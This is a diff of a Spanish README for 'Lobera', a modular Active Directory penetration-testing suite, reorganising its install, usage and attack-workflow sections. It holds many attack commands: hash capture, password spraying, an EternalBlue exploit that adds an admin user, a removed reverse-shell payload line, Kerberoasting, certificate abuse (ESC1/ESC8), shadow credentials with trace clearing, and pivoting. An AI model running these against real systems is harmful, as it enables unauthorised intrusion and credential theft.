@@ -10,15 +10,17 @@
 </p>
 
 <p align="center">
-  <img src="https://img.shields.io/badge/python-3.10%2B-blue?style=flat-square"/>
-  <img src="https://img.shields.io/badge/protocolos-SMB%20·%20Kerberos%20·%20LDAP%20·%20RPC%20·%20WinRM%20·%20SSH%20·%20SSL%20·%20HTTP%20·%20FTP%20·%20MSSQL-red?style=flat-square"/>
-  <img src="https://img.shields.io/badge/estado-activo-green?style=flat-square"/>
-  <img src="https://img.shields.io/badge/autor-mitr0kerb-cyan?style=flat-square"/>
+  <a href="https://pypi.org/project/lobera/"><img src="https://img.shields.io/pypi/v/lobera?style=flat-square&color=blue&label=PyPI"/></a>
+  <a href="https://pypi.org/project/lobera/"><img src="https://img.shields.io/pypi/dm/lobera?style=flat-square&color=brightgreen&label=descargas"/></a>
+  <a href="https://pypi.org/project/lobera/"><img src="https://img.shields.io/pypi/pyversions/lobera?style=flat-square&label=python"/></a>
+  <img src="https://img.shields.io/badge/protocolos-SMB·Kerberos·LDAP·RPC·WinRM·SSH·SSL·HTTP·FTP·MSSQL-red?style=flat-square"/>
+  <a href="LICENSE"><img src="https://img.shields.io/badge/licencia-MIT-yellow?style=flat-square"/></a>
+  <img src="https://img.shields.io/badge/plataforma-Linux%20%7C%20macOS-lightgrey?style=flat-square"/>
 </p>
 
 ---
 
-> ⚠️ **Beta** — muchos scripts están en desarrollo activo. Problemas: 📧 mitr0kerb@gmail.com
+> ⚠️ **Uso exclusivamente en sistemas propios o con permiso explícito por escrito. El uso no autorizado es ilegal.**
 
 ---
 
@@ -28,25 +30,67 @@ Lobera es una suite modular para enumerar y atacar entornos Active Directory. Ca
 
 No es un clon de CrackMapExec. Cada llamada mapea a una operación real de protocolo.
 
+**+230 scripts** organizados por protocolo y familia. CLI interactivo estilo Metasploit, scanner autopwn, base de datos de hallazgos y suite de herramientas independientes.
+
 ---
 
 ## Instalación
 
 ```bash
-git clone git@github.com:mitr0kerb/Lobera.git
+# Desde PyPI
+pip install lobera
+
+# Desde el repositorio (modo desarrollo)
+git clone https://github.com/mitr0kerb/Lobera.git
 cd Lobera
-pip install -e . --break-system-packages
+pip install -e .
 ```
 
-Esto instala tanto el CLI principal (`lobera`) como todas las herramientas de la suite.
+**Requisitos:** Python 3.10+
 
-**Requisitos:** Python 3.10+, impacket, rich, pyfiglet, pycryptodomex, pyasn1, pywinrm, ldap3, paramiko.
+---
+
+## Uso rápido
+
+```bash
+# Ver scripts disponibles de un protocolo
+lobera smb
+
+# Ejecutar un script
+lobera smb --script=shares -t 10.10.10.5 -u usuario -p 'Password123!'
+
+# Shell interactiva (estilo Metasploit)
+lobera kerberos --interactive-shell
+
+# Scanner autopwn
+lobera ldap --scanner
+
+# Ver hallazgos guardados
+lobera db findings -t 10.10.10.5
+```
+
+```
+╔══════════════════════════════════════════════╗
+║              L O B E R A  v0.2.0             ║
+║     Suite de Pentesting para Active Directory ║
+╚══════════════════════════════════════════════╝
+
+ Protocolos disponibles:
+  smb · kerberos · ldap · rpc · winrm · ssh · ssl · http · https · ftp · mssql
+
+ Herramientas:
+  lobera-server · lobera-watch · lobera-spray · lobera-tunnel · lobera-check
+
+smb-shell > load shares
+smb-shell(shares) > set target 10.10.10.5
+smb-shell(shares) > set user iker
+smb-shell(shares) > run
+[SMB] 10.10.10.5 — SYSVOL (READ) · NETLOGON (READ) · data (READ,WRITE)
+```
 
 ---
 
 ## La suite — herramientas independientes
-
-Además del CLI principal, Lobera incluye cuatro herramientas autónomas instaladas como comandos del sistema:
 
 | Herramienta | Descripción |
 |---|---|
@@ -56,9 +100,8 @@ Además del CLI principal, Lobera incluye cuatro herramientas autónomas instala
 | `lobera-tunnel` | Proxy SOCKS5 y reenvío de puertos sobre SSH para pivoting |
 | `lobera-check`  | Checker y exploit de vulnerabilidades conocidas (MS17-010 / EternalBlue) |
 
-Cada herramienta muestra su menú completo con ejemplos al ejecutarla sin argumentos.
-
-### lobera-server
+<details>
+<summary><b>lobera-server</b></summary>
 
 ```bash
 # Capturar hashes NTLMv2 — apunta víctimas a \\TU_IP\share
@@ -70,8 +113,10 @@ lobera-server http --ip 0.0.0.0 --port 8080 --dir /tmp/payloads
 # Ambos simultáneos
 lobera-server both --smb-port 8445 --http-port 8080 --output hashes.txt
 ```
+</details>
 
-### lobera-watch
+<details>
+<summary><b>lobera-watch</b></summary>
 
 ```bash
 # Monitorizar todo con intervalo de 30 segundos
@@ -85,26 +130,24 @@ lobera-watch -t 10.10.10.5 -u admin -H :aad3b435b51404eeaad3b435b51404ee -d CORP
 ```
 
 Detecta: nuevos usuarios · cambios de contraseña · lockouts · cambios en DA/EA/Admins · nuevos equipos · GPOs modificadas · SPNs añadidos · delegaciones.
+</details>
 
-### lobera-spray
+<details>
+<summary><b>lobera-spray</b></summary>
 
 ```bash
 # SMB con lista de usuarios y contraseñas
 lobera-spray smb -t 10.10.10.5 -U users.txt -P passwords.txt -d CORP.LOCAL --delay 2
-
-# WinRM — un usuario, varias contraseñas
-lobera-spray winrm -t 10.10.10.5 -u admin -P top100.txt -d CORP.LOCAL
-
-# LDAP con pausa entre rondas (anti-lockout estricto)
-lobera-spray ldap -t 10.10.10.5 -U users.txt -P passes.txt -d CORP.LOCAL --rounds 1 --pause 1800
 
 # Todos los protocolos de una vez
 lobera-spray all -t 10.10.10.5 -u admin -p 'Winter2024!' -d CORP.LOCAL
 ```
 
 Protocolos: `smb` · `winrm` · `ssh` · `ldap` · `all`. Flags de anti-lockout: `--delay`, `--jitter`, `--rounds`, `--pause`.
+</details>
 
-### lobera-tunnel
+<details>
+<summary><b>lobera-tunnel</b></summary>
 
 ```bash
 # Proxy SOCKS5 — usa con proxychains
@@ -113,15 +156,11 @@ proxychains nmap -sV 192.168.1.0/24
 
 # Acceder a RDP interno desde tu máquina
 lobera-tunnel forward -t PIVOT -u user -p 'P@ss' --local-port 13389 --remote-host 192.168.1.10 --remote-port 3389
-
-# Recibir shell reversa del objetivo
-lobera-tunnel reverse -t PIVOT -u user -p 'P@ss' --remote-port 4444 --local-port 4444
-
-# Varios túneles desde YAML
-lobera-tunnel multi -t PIVOT -u user -p 'P@ss' --config tunnels.yaml
 ```
+</details>
 
-### lobera-check
+<details>
+<summary><b>lobera-check</b></summary>
 
 ```bash
 # Comprobar si un host es vulnerable a EternalBlue
@@ -129,13 +168,8 @@ lobera-check ms17010 check -t 192.168.1.10
 
 # Ejecutar un comando como SYSTEM
 lobera-check ms17010 exploit -t 192.168.1.10 --payload cmd --cmd "net user hacker P@ss1234 /add"
-
-# Reverse shell PowerShell
-lobera-check ms17010 exploit -t 192.168.1.10 --payload shell --lhost 192.168.1.5 --lport 4444
-
-# Escanear un rango completo
-for ip in 192.168.1.{1..254}; do lobera-check ms17010 check -t $ip 2>/dev/null; done
 ```
+</details>
 
 ---
 
@@ -185,7 +219,8 @@ lobera kerberos --scanner
 
 ## Scripts disponibles
 
-### SMB (445)
+<details>
+<summary><b>SMB (445) — 25 scripts</b></summary>
 
 | Familia | Script | Descripción |
 |---------|--------|-------------|
@@ -217,8 +252,10 @@ lobera kerberos --scanner
 | post | `reg-dump` | Vuelca claves del registro |
 | post | `service-list` | Lista servicios del sistema |
 | post | `task-list` | Lista tareas programadas |
+</details>
 
-### Kerberos (88)
+<details>
+<summary><b>Kerberos (88) — 20 scripts</b></summary>
 
 | Familia | Script | Descripción |
 |---------|--------|-------------|
@@ -242,8 +279,10 @@ lobera kerberos --scanner
 | exploits | `sam-spoofing` | sAMAccountName spoofing (noPac) |
 | exploits | `reset-nightmare` | Abuso de reset de contraseña Kerberos |
 | exploits | `kerber-loss` | Explotación de debilidades en cifrado Kerberos |
+</details>
 
-### LDAP (389/636)
+<details>
+<summary><b>LDAP (389/636) — 17 scripts</b></summary>
 
 | Familia | Script | Descripción |
 |---------|--------|-------------|
@@ -264,182 +303,30 @@ lobera kerberos --scanner
 | exploits | `password-spray-ldap` | Spray de contraseñas contra LDAP |
 | exploits | `shadow-creds` | Escribe msDS-KeyCredentialLink → TGT sin cambiar contraseña |
 | exploits | `ntlm-relay-setup` | Verifica prerequisitos y genera comandos para NTLM Relay |
+</details>
 
-### RPC (135)
+<details>
+<summary><b>RPC (135), WinRM (5985), SSH (22), SSL/TLS, HTTP/HTTPS, FTP (21), MSSQL (1433)</b></summary>
 
-| Familia | Script | Descripción |
-|---------|--------|-------------|
-| enum | `domain-info` | Info del dominio vía RPC |
-| enum | `users` | Enumera usuarios vía MS-SAMR |
-| enum | `groups` | Enumera grupos vía RPC |
-| enum | `sessions` | Sesiones activas vía MS-SRVS |
-| enum | `services` | Servicios del sistema vía MS-SCMR |
-| enum | `privileges` | Privilegios de cuentas |
-| enum | `registry` | Acceso al registro vía MS-RRP |
-| attack | `coerce` | PetitPotam / PrinterBug / DFSCoerce — fuerza autenticación NTLM |
-| attack | `exec-service` | Ejecución remota vía creación de servicio |
-| attack | `rid-brute` | Enumeración de usuarios por RID brute force |
-| exploits | `petitpotam` | MS-EFSRPC coerción (versión standalone) |
-| exploits | `printnightmare` | CVE-2021-1675 vía MS-RPRN |
-| exploits | `sam-dump` | Vuelca SAM/SYSTEM vía MS-RRP |
-
-### WinRM (5985/5986)
-
-| Familia | Script | Descripción |
-|---------|--------|-------------|
-| enum | `check` | Comprueba si WinRM está activo y accesible |
-| enum | `sysinfo` | Información del sistema vía WinRM |
-| attack | `password-spray` | Spray de contraseñas contra WinRM |
-| exploits | `evil-winrm-payload` | Shell interactiva vía WinRM |
-| exploits | `privesc-check` | Comprobaciones de escalada de privilegios |
-
-### SSH (22)
-
-| Familia | Script | Descripción |
-|---------|--------|-------------|
-| enum | `banner-grab` | Banner del servidor SSH |
-| enum | `auth-methods` | Métodos de autenticación permitidos |
-| enum | `host-key-fingerprint` | Fingerprint de la clave del host |
-| enum | `key-exchange-enum` | Algoritmos de intercambio de claves |
-| enum | `user-enum` | Enumeración de usuarios válidos |
-| enum | `terrapin-check` | Detección de vulnerabilidad Terrapin (CVE-2023-48795) |
-| attack | `password-spray` | Spray de contraseñas contra SSH |
-| attack | `brute-force` | Fuerza bruta SSH |
-| attack | `key-auth-test` | Prueba autenticación con clave privada |
-| attack | `known-keys` | Prueba claves privadas conocidas/débiles |
-| exploits | `regresshion` | CVE-2024-6387 — regreSSHion |
-| exploits | `terrapin-exploit` | Explotación de Terrapin |
-| exploits | `libssh-bypass` | CVE-2018-10933 — bypass de autenticación libssh |
-| post | `config-dump` | Vuelca configuración del servidor |
-| post | `key-harvest` | Recolecta claves SSH del sistema |
-| post | `lateral-move` | Movimiento lateral vía SSH |
-| post | `persistence` | Mecanismos de persistencia vía SSH |
-
-### SSL/TLS (443+)
-
-| Familia | Script | Descripción |
-|---------|--------|-------------|
-| enum | `cert-info` | Información del certificado |
-| enum | `cipher-enum` | Enumeración de cifrados soportados |
-| enum | `protocol-version` | Versiones TLS soportadas (SSLv3, TLS 1.0...) |
-| enum | `san-enum` | Subject Alternative Names del certificado |
-| enum | `hsts-check` | Comprueba HSTS y otras cabeceras de seguridad |
-| enum | `ocsp-check` | Estado de revocación OCSP |
-| enum | `ct-log-search` | Búsqueda en Certificate Transparency logs |
-| attack | `heartbleed` | CVE-2014-0160 — Heartbleed |
-| attack | `poodle` | CVE-2014-3566 — POODLE |
-| exploits | `tls-poison` | TLS poison / BEAST |
-| exploits | `alpn-confusion` | ALPN confusion attacks |
-| exploits | `cert-spoof-check` | Detección de posibilidad de spoofing de certificado |
-| exploits | `openssl-cve-2022-0778` | CVE-2022-0778 — loop infinito en OpenSSL |
-
-### HTTP (80)
-
-| Familia | Script | Descripción |
-|---------|--------|-------------|
-| enum | `banner-grab` | Banner y cabeceras del servidor |
-| enum | `tech-detect` | Detección de tecnologías (servidor, framework, CMS) |
-| enum | `robots-sitemap` | Lectura de robots.txt y sitemap.xml |
-| enum | `cors-check` | Comprueba configuración CORS |
-| enum | `js-secrets` | Busca secretos en ficheros JavaScript |
-| enum | `http2-check` | Soporte HTTP/2 |
-| enum | `ssl-redirect` | Comprueba redirección HTTP → HTTPS |
-| attack | `sqli-detect` | Detección de SQL Injection |
-| attack | `xss-detect` | Detección de XSS |
-| attack | `lfi-detect` | Detección de Local File Inclusion |
-| attack | `ssrf-detect` | Detección de SSRF |
-| attack | `open-redirect` | Detección de Open Redirect |
-| attack | `header-injection` | Inyección de cabeceras HTTP |
-| attack | `jwt-attack` | Ataques sobre JWT (alg:none, weak secret...) |
-| attack | `graphql-enum` | Enumeración de esquema GraphQL |
-| exploit | `log4shell` | CVE-2021-44228 — Log4Shell |
-| exploit | `shellshock` | CVE-2014-6271 — Shellshock |
-| exploit | `php-cgi-rce` | CVE-2012-1823 — PHP CGI RCE |
-| exploit | `apache-path-traversal` | Path traversal en Apache |
-| exploit | `http-request-smuggling` | HTTP Request Smuggling |
-| post | `crawl` | Rastreo de la aplicación web |
-| post | `extract-links` | Extracción de enlaces y recursos |
-
-### HTTPS (443)
-
-| Familia | Script | Descripción |
-|---------|--------|-------------|
-| enum | `banner-grab` | Banner y cabeceras |
-| enum | `tech-detect` | Detección de tecnologías |
-| enum | `robots-sitemap` | robots.txt y sitemap.xml |
-| enum | `cors-check` | Configuración CORS |
-| enum | `js-secrets` | Secretos en JavaScript |
-| enum | `security-headers` | Cabeceras de seguridad (CSP, HSTS, X-Frame...) |
-| enum | `certificate-pinning` | Detección de certificate pinning |
-| enum | `dir-bruteforce` | Fuerza bruta de directorios |
-| attack | `sqli-detect` | SQL Injection |
-| attack | `xss-detect` | XSS |
-| attack | `lfi-detect` | Local File Inclusion |
-| attack | `ssrf-detect` | SSRF |
-| attack | `jwt-attack` | Ataques JWT |
-| attack | `oauth-misconfig` | Detección de misconfiguraciones OAuth |
-| attack | `cache-poisoning` | Web Cache Poisoning |
-| exploit | `log4shell` | CVE-2021-44228 |
-| exploit | `spring4shell` | CVE-2022-22965 — Spring4Shell |
-| exploit | `jenkins-file-read` | Lectura arbitraria de ficheros en Jenkins |
-| exploit | `php-cgi-rce` | PHP CGI RCE |
-| exploit | `tls-stripping` | TLS Stripping |
-| post | `crawl` | Rastreo web |
-| post | `extract-links` | Extracción de enlaces |
-
-### FTP (21)
-
-| Familia | Script | Descripción |
-|---------|--------|-------------|
-| enum | `anon-check` | Acceso anónimo FTP |
-| enum | `banner-grab` | Banner del servidor |
-| enum | `service-info` | Información del servicio |
-| enum | `list-files` | Lista ficheros accesibles |
-| enum | `user-enum` | Enumeración de usuarios |
-| attack | `password-spray` | Spray de contraseñas |
-| attack | `brute-force` | Fuerza bruta FTP |
-| attack | `write-check` | Comprueba permisos de escritura |
-| attack | `bounce-scan` | FTP Bounce Scan |
-| exploit | `vsftpd-backdoor` | CVE-2011-2523 — backdoor vsftpd 2.3.4 |
-| exploit | `proftpd-bypass` | Bypass de autenticación ProFTPD |
-| exploit | `anonymous-webshell` | Webshell vía acceso anónimo FTP |
-| exploit | `ssl-strip` | SSL Strip en FTP |
-| post | `download-loot` | Descarga ficheros de interés |
-| post | `pivot-setup` | Configura pivoting vía FTP |
-
-### MSSQL (1433)
-
-| Familia | Script | Descripción |
-|---------|--------|-------------|
-| enum | `instance-enum` | Enumera instancias MSSQL |
-| enum | `version-enum` | Versión del servidor |
-| enum | `auth-check` | Comprueba modos de autenticación |
-| enum | `user-enum` | Enumera usuarios de la base de datos |
-| enum | `db-enum` | Enumera bases de datos |
-| enum | `linked-servers` | Enumera servidores enlazados |
-| enum | `privs-check` | Comprueba privilegios del usuario actual |
-| attack | `password-spray` | Spray de contraseñas |
-| attack | `xp-cmdshell` | Ejecución de comandos vía xp_cmdshell |
-| attack | `ntlm-steal` | Robo de hash NTLM vía UNC path |
-| exploit | `xp-cmdshell-enable` | Habilita xp_cmdshell si está desactivado |
-| exploit | `linked-exec` | Ejecución en servidor enlazado |
-| exploit | `clr-exec` | Ejecución de código .NET vía CLR |
-| exploit | `agent-job` | Ejecución vía SQL Server Agent Job |
-| post | `custom-query` | Ejecuta una query personalizada |
-| post | `dump-hashes` | Vuelca hashes de usuarios |
-| post | `read-file` | Lee ficheros del sistema vía MSSQL |
+Ver tabla completa en [`docs/scripts.md`](docs/scripts.md) — más de 130 scripts adicionales cubriendo RPC, WinRM, SSH, SSL/TLS, HTTP, HTTPS, FTP y MSSQL.
+</details>
 
 ---
 
 ## Flujos de ataque habituales
 
-### Kerberoasting → crackeo offline
+<details>
+<summary><b>Kerberoasting → crackeo offline</b></summary>
+
 ```bash
 lobera kerberos --script=kerberoasting -t 10.10.10.5 -u iker -p Pass123! -d CORP.LOCAL
 hashcat -m 13100 hashes.txt rockyou.txt
 ```
+</details>
 
-### ESC1 — Certificado como Administrador
+<details>
+<summary><b>ESC1 — Certificado como Administrador</b></summary>
+
 ```bash
 # 1. Buscar plantilla vulnerable
 lobera ldap --script=enum-templates -t 10.10.10.5 -u iker -p Pass123! -d CORP.LOCAL
@@ -451,32 +338,27 @@ lobera ldap --script=request-cert -t 10.10.10.5 -u iker -p Pass123! -d CORP.LOCA
 # 3. Obtener TGT + NT hash
 certipy auth -pfx administrator.pfx -dc-ip 10.10.10.5
 ```
+</details>
 
-### Coerción + NTLM Relay → ADCS (ESC8)
+<details>
+<summary><b>Coerción + NTLM Relay → ADCS (ESC8)</b></summary>
+
 ```bash
 # Terminal 1: relay hacia ADCS
 lobera ldap --script=ntlm-relay-setup -t 10.10.10.5 -d CORP.LOCAL \
   --mode adcs --ca CORP-CA --attacker-ip 10.10.14.1
 
-# Terminal 2: coercionar al DC con lobera-server
+# Terminal 2: coercionar al DC
 lobera-server smb --ip 0.0.0.0 --port 8445 --output hashes.txt
-# o directamente desde el CLI
-lobera rpc --script=coerce -t 10.10.10.5 --listener 10.10.14.1
 
 # → cert.pfx como DC$ → DCSync
 certipy auth -pfx dc.pfx -dc-ip 10.10.10.5
 ```
+</details>
 
-### Spray + relay NTLM
-```bash
-# 1. Spray para encontrar credenciales
-lobera-spray smb -t 10.10.10.5 -U users.txt -P passwords.txt -d CORP.LOCAL --delay 5
+<details>
+<summary><b>Shadow Credentials → TGT sin cambiar contraseña</b></summary>
 
-# 2. Con credenciales: capturar más hashes internos
-lobera-server smb --ip 0.0.0.0 --port 8445 --output hashes_internos.txt
-```
-
-### Shadow Credentials → TGT sin cambiar contraseña
 ```bash
 lobera ldap --script=shadow-creds -t 10.10.10.5 -u iker -p Pass123! -d CORP.LOCAL \
   --target-user victima
@@ -484,25 +366,20 @@ certipy auth -pfx victima.pfx -dc-ip 10.10.10.5
 # Limpiar rastro
 lobera ldap --script=shadow-creds ... --target-user victima --clear
 ```
+</details>
 
-### Pivoting desde un host comprometido
+<details>
+<summary><b>Pivoting desde un host comprometido</b></summary>
+
 ```bash
-# 1. Túnel SOCKS5 a través del host comprometido
+# Túnel SOCKS5 a través del host comprometido
 lobera-tunnel socks5 -t PIVOT_IP -u user -p 'P@ss' --local-port 1080
 
-# 2. Atacar red interna con proxychains
+# Atacar red interna con proxychains
 proxychains lobera ldap --script=users -t 192.168.1.5 -u iker -p Pass123! -d INT.LOCAL
 proxychains lobera-spray smb -t 192.168.1.0/24 -u admin -p 'Pass!' -d INT.LOCAL
-
-# 3. Monitorizar cambios en el DC interno
-proxychains lobera-watch -t 192.168.1.1 -u auditor -p 'P@ss' -d INT.LOCAL
 ```
-
-### BloodHound lite — mapa de ataque rápido
-```bash
-lobera ldap --script=bloodhound-lite -t 10.10.10.5 -u iker -p Pass123! -d CORP.LOCAL
-# → rutas críticas ordenadas por severidad sin levantar BloodHound
-```
+</details>
 
 ---
 
@@ -540,17 +417,18 @@ Crea un fichero en `scripts/<protocolo>/<familia>/mi_script.py` y Lobera lo desc
 
 ## Plataformas
 
-- Linux (Kali, Parrot) — principal
-- macOS (Apple Silicon) — probado
-- Windows — sin probar
+| Plataforma | Estado |
+|---|---|
+| Linux (Kali, Parrot, Ubuntu) | ✅ Principal |
+| macOS (Apple Silicon / Intel) | ✅ Probado |
+| Windows | ⚠️ Sin probar |
 
 ---
 
-## Aviso legal
+## Licencia
 
-Lobera es un proyecto personal educativo. Úsalo únicamente en sistemas propios o con permiso explícito por escrito. El uso no autorizado contra sistemas de terceros es ilegal.
+MIT — ver [LICENSE](LICENSE).
 
 ---
 
-**mitr0kerb** — construido como inmersión práctica en los protocolos de Active Directory.
-Contacto: 📧 mitr0kerb@gmail.com
+**mitr0kerb** · construido como inmersión práctica en los protocolos de Active Directory · 📧 mitr0kerb@gmail.com
